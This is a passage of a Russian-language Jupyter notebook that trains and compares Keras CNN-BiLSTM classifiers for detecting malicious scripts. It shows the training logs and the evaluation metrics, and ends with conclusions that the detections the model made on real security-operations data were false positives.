    "val_dataset = val_dataset.batch(16).prefetch(tf.data.AUTOTUNE)\n",
    "test_dataset = test_dataset.batch(16).prefetch(tf.data.AUTOTUNE)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "9b729c7d-25f7-4309-b501-c538a6c94090",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"model\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " input_1 (InputLayer)        [(None, 1)]               0         \n",
      "                                                                 \n",
      " text_vectorization (TextVe  (None, 2000)              0         \n",
      " ctorization)                                                    \n",
      "                                                                 \n",
      " embedding (Embedding)       (None, 2000, 16)          1440000   \n",
      "                                                                 \n",
      " conv1d (Conv1D)             (None, 2000, 32)          16416     \n",
      "                                                                 \n",
      " max_pooling1d (MaxPooling1  (None, 1000, 32)          0         \n",
      " D)                                                              \n",
      "                                                                 \n",
      " bidirectional (Bidirection  (None, 32)                6272      \n",
      " al)                                                             \n",
      "                                                                 \n",
      " dense (Dense)               (None, 2)                 66        \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 1462754 (5.58 MB)\n",
      "Trainable params: 1462754 (5.58 MB)\n",
      "Non-trainable params: 0 (0.00 Byte)\n",
      "_________________________________________________________________\n",
      "None\n"
     ]
    }
   ],
   "source": [
    "inputs = layers.Input(shape=(1,), dtype=tf.string)\n",
    "text_vectors = text_vectorizer(inputs) # Слой TextVectorization\n",
    "token_embeddings = token_embed(text_vectors) # Слой Embedding\n",
    "model = layers.Convolution1D(32, kernel_size=32, padding=\"same\",activation=\"relu\")(token_embeddings)\n",
    "model = layers.MaxPooling1D(pool_size=(2))(model)\n",
    "model = layers.Bidirectional(layers.LSTM(16))(model)\n",
    "outputs = layers.Dense(2, activation=\"softmax\")(model)\n",
    "model_angara = tf.keras.Model(inputs, outputs)\n",
    "\n",
    "model_angara.compile(loss=\"categorical_crossentropy\",\n",
    "                   optimizer=tf.keras.optimizers.Adam(learning_rate=1e-4),\n",
    "                   metrics=[\"accuracy\"])\n",
    "print(model_angara.summary())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "a6cf65cc-ebfd-4e73-8bd9-16d04c90b4fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "checkpoint = tf.keras.callbacks.ModelCheckpoint(filepath='model_angara',\n",
    "                                                monitor='val_accuracy',\n",
    "                                                save_best_only=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "bdc3a647-e6a6-42b8-a90d-6659a43bdb9d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/15\n",
      "409/409 [==============================] - ETA: 0s - loss: 0.3717 - accuracy: 0.9292INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "409/409 [==============================] - 48s 114ms/step - loss: 0.3717 - accuracy: 0.9292 - val_loss: 0.0790 - val_accuracy: 0.9920\n",
      "Epoch 2/15\n",
      "409/409 [==============================] - ETA: 0s - loss: 0.0476 - accuracy: 0.9956INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "409/409 [==============================] - 46s 113ms/step - loss: 0.0476 - accuracy: 0.9956 - val_loss: 0.0296 - val_accuracy: 0.9951\n",
      "Epoch 3/15\n",
      "409/409 [==============================] - ETA: 0s - loss: 0.0232 - accuracy: 0.9969INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "409/409 [==============================] - 46s 112ms/step - loss: 0.0232 - accuracy: 0.9969 - val_loss: 0.0179 - val_accuracy: 0.9976\n",
      "Epoch 4/15\n",
      "409/409 [==============================] - 42s 103ms/step - loss: 0.0136 - accuracy: 0.9983 - val_loss: 0.0135 - val_accuracy: 0.9976\n",
      "Epoch 5/15\n",
      "409/409 [==============================] - ETA: 0s - loss: 0.0088 - accuracy: 0.9992INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "409/409 [==============================] - 46s 112ms/step - loss: 0.0088 - accuracy: 0.9992 - val_loss: 0.0110 - val_accuracy: 0.9982\n",
      "Epoch 6/15\n",
      "409/409 [==============================] - 43s 104ms/step - loss: 0.0070 - accuracy: 0.9994 - val_loss: 0.0100 - val_accuracy: 0.9982\n",
      "Epoch 7/15\n",
      "409/409 [==============================] - 42s 104ms/step - loss: 0.0057 - accuracy: 0.9995 - val_loss: 0.0097 - val_accuracy: 0.9982\n",
      "Epoch 8/15\n",
      "114/409 [=======>......................] - ETA: 29s - loss: 0.0056 - accuracy: 0.9995"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "IOPub message rate exceeded.\n",
      "The notebook server will temporarily stop sending output\n",
      "to the client in order to avoid crashing it.\n",
      "To change this limit, set the config variable\n",
      "`--NotebookApp.iopub_msg_rate_limit`.\n",
      "\n",
      "Current values:\n",
      "NotebookApp.iopub_msg_rate_limit=1000.0 (msgs/sec)\n",
      "NotebookApp.rate_limit_window=3.0 (secs)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "model_history = model_angara.fit(train_dataset,\n",
    "                              epochs=15,\n",
    "                              validation_data=val_dataset,\n",
    "                              callbacks=[checkpoint])\n",
    "\n",
    "plot_training_stat(model_history)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "cf62bd7e-87a2-4129-b3c7-f83b55f9f22b",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.metrics import confusion_matrix, ConfusionMatrixDisplay\n",
    "\n",
    "\n",
    "\n",
    "# Функция для подготовки результатов обучения модели\n",
    "def calculate_results(y_true, y_pred):\n",
    "    # Расчет accuracy\n",
    "    model_accuracy = accuracy_score(y_true, y_pred) * 100\n",
    "    # Расчет precision, recall, f1\n",
    "    model_precision, model_recall, model_f1, support = precision_recall_fscore_support(y_true, y_pred, average=\"weighted\")\n",
    "    model_results = {\"accuracy\": model_accuracy,\n",
    "                  \"precision\": model_precision,\n",
    "                  \"recall\": model_recall,\n",
    "                  \"f1\": model_f1}\n",
    "    return model_results\n",
    "\n",
    "def get_predict(model, X_test, ohe=True):\n",
    "    test_model = tf.keras.models.load_model(model)\n",
    "    \n",
    "    if ohe:\n",
    "        model_test_probs = test_model.predict(X_test)\n",
    "        model_test_preds = tf.argmax(model_test_probs, axis=1)  \n",
    "        model_test_probs = [res[1] for res in model_test_probs]\n",
    "    else:\n",
    "        model_test_probs = test_model.predict(X_test).squeeze()\n",
    "        model_test_preds = [int(res>=0.5) for res in model_test_probs]\n",
    "        \n",
    "        \n",
    "    return model_test_probs, model_test_preds\n",
    "\n",
    "def show_results(model_name, X_test, y_test, X_val, y_val):\n",
    "        \n",
    "    print('Тестирование модели на тестовых данных')\n",
    "    \n",
    "    model_test_probs, model_test_preds = get_predict(\n",
    "        model_name, X_test, ohe=model_name.find(\"simple\")<0)\n",
    "\n",
    "    model_test_results = calculate_results(y_true=y_test,\n",
    "                                           y_pred=model_test_preds)\n",
    "    \n",
    "    print('Результаты тестирования: \\n', model_test_results)\n",
    "    cm = confusion_matrix(y_test, model_test_preds)\n",
    "    disp = ConfusionMatrixDisplay(confusion_matrix=cm)\n",
    "    disp.plot()\n",
    "    plt.show()\n",
    "\n",
    "    print('Тестирование модели на валидационных данных')\n",
    "    model_val_probs, model_val_preds = get_predict(\n",
    "        model_name, X_val, ohe=model_name.find(\"simple\")<0)\n",
    "\n",
    "    model_val_results = calculate_results(y_true=y_val,\n",
    "                                           y_pred=model_val_preds)    \n",
    "    \n",
    "    print('Результаты тестирования: \\n', model_test_results)\n",
    "    cm = confusion_matrix(y_val, model_val_preds)\n",
    "    disp = ConfusionMatrixDisplay(confusion_matrix=cm)\n",
    "    disp.plot()\n",
    "    plt.show()\n",
    "\n",
    "    plt.hist(model_val_probs, bins=100)\n",
    "    plt.title(\"Распределение вероятности\")\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "5f7002d0-2e3f-48d1-8f58-0dbf0d1889a8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на тестовых данных\n",
      "7/7 [==============================] - 0s 17ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на валидационных данных\n",
      "103/103 [==============================] - 2s 17ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "show_results(\"model_angara\", test_dataset, y_test, val_dataset, y_val)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6acb0bf4-cb9f-4af8-b88d-82368b519c82",
   "metadata": {},
   "source": [
    "### 1.5.2. Без всяких там prefetch"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da7d930a-29d3-488f-a573-cd537caf17cb",
   "metadata": {},
   "source": [
    "Вместо того, чтобы разбираться с функциональностью prefetch, я вследствие лени решил просто повторить код без prefetch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "75d5e75d-c89c-409e-a8ad-36214500eac8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"model_1\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " input_2 (InputLayer)        [(None, 1)]               0         \n",
      "                                                                 \n",
      " text_vectorization (TextVe  (None, 2000)              0         \n",
      " ctorization)                                                    \n",
      "                                                                 \n",
      " embedding (Embedding)       (None, 2000, 16)          1440000   \n",
      "                                                                 \n",
      " conv1d_1 (Conv1D)           (None, 2000, 32)          16416     \n",
      "                                                                 \n",
      " max_pooling1d_1 (MaxPoolin  (None, 1000, 32)          0         \n",
      " g1D)                                                            \n",
      "                                                                 \n",
      " bidirectional_1 (Bidirecti  (None, 32)                6272      \n",
      " onal)                                                           \n",
      "                                                                 \n",
      " dense_1 (Dense)             (None, 2)                 66        \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 1462754 (5.58 MB)\n",
      "Trainable params: 1462754 (5.58 MB)\n",
      "Non-trainable params: 0 (0.00 Byte)\n",
      "_________________________________________________________________\n",
      "None\n",
      "Epoch 1/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.4867 - accuracy: 0.9752INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 33s 153ms/step - loss: 0.4867 - accuracy: 0.9752 - val_loss: 0.2785 - val_accuracy: 0.9969\n",
      "Epoch 2/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.1705 - accuracy: 0.9982INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 31s 150ms/step - loss: 0.1705 - accuracy: 0.9982 - val_loss: 0.1041 - val_accuracy: 0.9982\n",
      "Epoch 3/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.0738 - accuracy: 0.9994INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_angara_lite/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 31s 150ms/step - loss: 0.0738 - accuracy: 0.9994 - val_loss: 0.0548 - val_accuracy: 0.9988\n",
      "Epoch 4/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0409 - accuracy: 0.9994 - val_loss: 0.0333 - val_accuracy: 0.9988\n",
      "Epoch 5/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0257 - accuracy: 0.9997 - val_loss: 0.0224 - val_accuracy: 0.9988\n",
      "Epoch 6/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0174 - accuracy: 1.0000 - val_loss: 0.0177 - val_accuracy: 0.9988\n",
      "Epoch 7/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0126 - accuracy: 1.0000 - val_loss: 0.0137 - val_accuracy: 0.9988\n",
      "Epoch 8/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0095 - accuracy: 1.0000 - val_loss: 0.0112 - val_accuracy: 0.9988\n",
      "Epoch 9/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0073 - accuracy: 1.0000 - val_loss: 0.0099 - val_accuracy: 0.9988\n",
      "Epoch 10/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0058 - accuracy: 1.0000 - val_loss: 0.0088 - val_accuracy: 0.9988\n",
      "Epoch 11/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0047 - accuracy: 1.0000 - val_loss: 0.0080 - val_accuracy: 0.9988\n",
      "Epoch 12/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0039 - accuracy: 1.0000 - val_loss: 0.0069 - val_accuracy: 0.9988\n",
      "Epoch 13/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0032 - accuracy: 1.0000 - val_loss: 0.0066 - val_accuracy: 0.9988\n",
      "Epoch 14/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0027 - accuracy: 1.0000 - val_loss: 0.0064 - val_accuracy: 0.9988\n",
      "Epoch 15/15\n",
      " 69/205 [=========>....................] - ETA: 17s - loss: 0.0024 - accuracy: 1.0000"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "IOPub message rate exceeded.\n",
      "The notebook server will temporarily stop sending output\n",
      "to the client in order to avoid crashing it.\n",
      "To change this limit, set the config variable\n",
      "`--NotebookApp.iopub_msg_rate_limit`.\n",
      "\n",
      "Current values:\n",
      "NotebookApp.iopub_msg_rate_limit=1000.0 (msgs/sec)\n",
      "NotebookApp.rate_limit_window=3.0 (secs)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Отдельно сохраняем валидационные метки, далее будем использовать для тестирования модели.\n",
    "val_labels_encoded = y_val\n",
    "\n",
    "one_hot_encoder = OneHotEncoder(sparse_output=False)\n",
    "train_labels = one_hot_encoder.fit_transform(y_train.to_numpy().reshape(-1, 1))\n",
    "val_labels = one_hot_encoder.transform(y_val.to_numpy().reshape(-1, 1))\n",
    "\n",
    "inputs = layers.Input(shape=(1,), dtype=tf.string)\n",
    "text_vectors = text_vectorizer(inputs) # Слой TextVectorization\n",
    "token_embeddings = token_embed(text_vectors) # Слой Embedding\n",
    "model = layers.Convolution1D(32, kernel_size=32, padding=\"same\",activation=\"relu\")(token_embeddings)\n",
    "model = layers.MaxPooling1D(pool_size=(2))(model)\n",
    "model = layers.Bidirectional(layers.LSTM(16))(model)\n",
    "outputs = layers.Dense(2, activation=\"softmax\")(model)\n",
    "model_angara_lite = tf.keras.Model(inputs, outputs)\n",
    "\n",
    "model_angara_lite.compile(loss=\"categorical_crossentropy\",\n",
    "                   optimizer=tf.keras.optimizers.Adam(learning_rate=1e-4),\n",
    "                   metrics=[\"accuracy\"])\n",
    "print(model_angara_lite.summary())\n",
    "\n",
    "checkpoint = tf.keras.callbacks.ModelCheckpoint(filepath='model_angara_lite',\n",
    "                                                monitor='val_accuracy',\n",
    "                                                save_best_only=True)\n",
    "\n",
    "model_history = model_angara_lite.fit(X_train, train_labels,\n",
    "                              epochs=15,\n",
    "                              validation_data=(X_val, val_labels),\n",
    "                              callbacks=[checkpoint])\n",
    "\n",
    "plot_training_stat(model_history)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "232db488-f1f5-4f02-b90b-835d0bc31e16",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на тестовых данных\n",
      "7/7 [==============================] - 0s 18ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на валидационных данных\n",
      "103/103 [==============================] - 2s 17ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "show_results(\"model_angara_lite\", test_dataset, y_test, val_dataset, y_val)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a1c917f",
   "metadata": {},
   "source": [
    "**Вывод:** Результаты принципиально не различаются, у упрощенной модели они чуть лучше, но и разброс вероятностей по классу 0 хуже. ЗАто обучается быстрее"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "613084af-9ad8-4a68-9aa4-45498b5cb281",
   "metadata": {},
   "source": [
    "### 1.5.3. Упрощенка"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e9a3d7b4",
   "metadata": {},
   "source": [
    "т.к. Было неочевидно преобразование целевого признака с использованием one hot encoding, то я на всякий случай попробовал отказаться от этого преобразования (было target-> ohe+softmax+categorical_crossentropy, стало targer -> sigmoid+binary_crossentropy)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "aa34a2f8-c2df-468e-8ed1-b03c39def7bb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"model_2\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " input_3 (InputLayer)        [(None, 1)]               0         \n",
      "                                                                 \n",
      " text_vectorization (TextVe  (None, 2000)              0         \n",
      " ctorization)                                                    \n",
      "                                                                 \n",
      " embedding (Embedding)       (None, 2000, 16)          1440000   \n",
      "                                                                 \n",
      " conv1d_2 (Conv1D)           (None, 2000, 32)          16416     \n",
      "                                                                 \n",
      " max_pooling1d_2 (MaxPoolin  (None, 1000, 32)          0         \n",
      " g1D)                                                            \n",
      "                                                                 \n",
      " bidirectional_2 (Bidirecti  (None, 32)                6272      \n",
      " onal)                                                           \n",
      "                                                                 \n",
      " dense_2 (Dense)             (None, 1)                 33        \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 1462721 (5.58 MB)\n",
      "Trainable params: 1462721 (5.58 MB)\n",
      "Non-trainable params: 0 (0.00 Byte)\n",
      "_________________________________________________________________\n",
      "None\n",
      "Epoch 1/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.4014 - accuracy: 0.9939INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 33s 153ms/step - loss: 0.4014 - accuracy: 0.9939 - val_loss: 0.1855 - val_accuracy: 0.9976\n",
      "Epoch 2/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.1218 - accuracy: 0.9980INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 31s 151ms/step - loss: 0.1218 - accuracy: 0.9980 - val_loss: 0.0842 - val_accuracy: 0.9988\n",
      "Epoch 3/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0639 - accuracy: 0.9989 - val_loss: 0.0512 - val_accuracy: 0.9982\n",
      "Epoch 4/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0408 - accuracy: 0.9994 - val_loss: 0.0352 - val_accuracy: 0.9988\n",
      "Epoch 5/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0287 - accuracy: 0.9995 - val_loss: 0.0262 - val_accuracy: 0.9988\n",
      "Epoch 6/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0213 - accuracy: 0.9995 - val_loss: 0.0208 - val_accuracy: 0.9988\n",
      "Epoch 7/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0163 - accuracy: 0.9995 - val_loss: 0.0172 - val_accuracy: 0.9988\n",
      "Epoch 8/15\n",
      "205/205 [==============================] - ETA: 0s - loss: 0.0129 - accuracy: 0.9995INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: model_simple/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "205/205 [==============================] - 31s 150ms/step - loss: 0.0129 - accuracy: 0.9995 - val_loss: 0.0144 - val_accuracy: 0.9994\n",
      "Epoch 9/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0104 - accuracy: 1.0000 - val_loss: 0.0129 - val_accuracy: 0.9988\n",
      "Epoch 10/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0087 - accuracy: 1.0000 - val_loss: 0.0116 - val_accuracy: 0.9988\n",
      "Epoch 11/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0074 - accuracy: 1.0000 - val_loss: 0.0106 - val_accuracy: 0.9988\n",
      "Epoch 12/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0064 - accuracy: 1.0000 - val_loss: 0.0095 - val_accuracy: 0.9988\n",
      "Epoch 13/15\n",
      "205/205 [==============================] - 27s 132ms/step - loss: 0.0056 - accuracy: 1.0000 - val_loss: 0.0092 - val_accuracy: 0.9988\n",
      "Epoch 14/15\n",
      "205/205 [==============================] - 27s 133ms/step - loss: 0.0049 - accuracy: 1.0000 - val_loss: 0.0089 - val_accuracy: 0.9988\n",
      "Epoch 15/15\n",
      " 69/205 [=========>....................] - ETA: 17s - loss: 0.0044 - accuracy: 1.0000"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "IOPub message rate exceeded.\n",
      "The notebook server will temporarily stop sending output\n",
      "to the client in order to avoid crashing it.\n",
      "To change this limit, set the config variable\n",
      "`--NotebookApp.iopub_msg_rate_limit`.\n",
      "\n",
      "Current values:\n",
      "NotebookApp.iopub_msg_rate_limit=1000.0 (msgs/sec)\n",
      "NotebookApp.rate_limit_window=3.0 (secs)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "inputs = layers.Input(shape=(1,), dtype=tf.string)\n",
    "text_vectors = text_vectorizer(inputs) # Слой TextVectorization\n",
    "token_embeddings = token_embed(text_vectors) # Слой Embedding\n",
    "model = layers.Convolution1D(32, kernel_size=32, padding=\"same\",activation=\"relu\")(token_embeddings)\n",
    "model = layers.MaxPooling1D(pool_size=(2))(model)\n",
    "model = layers.Bidirectional(layers.LSTM(16))(model)\n",
    "outputs = layers.Dense(1, activation=\"sigmoid\")(model)\n",
    "model_simple = tf.keras.Model(inputs, outputs)\n",
    "\n",
    "model_simple.compile(loss=\"binary_crossentropy\",\n",
    "                   optimizer=tf.keras.optimizers.Adam(learning_rate=1e-4),\n",
    "                   metrics=[\"accuracy\"])\n",
    "print(model_simple.summary())\n",
    "\n",
    "checkpoint = tf.keras.callbacks.ModelCheckpoint(filepath='model_simple',\n",
    "                                                monitor='val_accuracy',\n",
    "                                                save_best_only=True)\n",
    "\n",
    "model_history = model_simple.fit(X_train, y_train,\n",
    "                              epochs=15,\n",
    "                              validation_data=(X_val, y_val),\n",
    "                              callbacks=[checkpoint]\n",
    "                              )\n",
    "\n",
    "plot_training_stat(model_history)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "333f6d5b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на тестовых данных\n",
      "4/4 [==============================] - 0s 22ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Тестирование модели на валидационных данных\n",
      "52/52 [==============================] - 1s 23ms/step\n",
      "Результаты тестирования: \n",
      " {'accuracy': 100.0, 'precision': 1.0, 'recall': 1.0, 'f1': 1.0}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "show_results(\"model_simple\", X_test, y_test, X_val, y_val)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0daad8e6",
   "metadata": {},
   "source": [
    "**Вывод:** принципиальных отличий также нет, результаты даже чуть лучше"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7f6d090f",
   "metadata": {
    "tags": []
   },
   "source": [
    "# Выводы\n",
    "1. Подход, реализованный специалистами Ангары - сильно упрощенная версия оригинального подхода, изложенного в статье. В нем не учитывается то, что скрипты могут быть разбиты на несколько сообщений, а, главное, никак не обучаются эмбеддинги\n",
    "2. Найденные моделью, обученной на тренировочных датасетах, вредоносные скрипты из реальных данных SOC на самом деле не являются таковыми. Это вероятно является следствием недостаточного разнообразных скриптов в обучающем датасете, а также упрощенным подходом, который предложили ребята из Ангары\n",
    "3. Данный подход можно развивать дальше для выявления вредоносов в скриптах, но с т.з. бизнес-процесса для SOC данная задача не является приоритетной, т.к. выявление вредоносных скриптов обычно выполняется локально"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31f84ee8",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
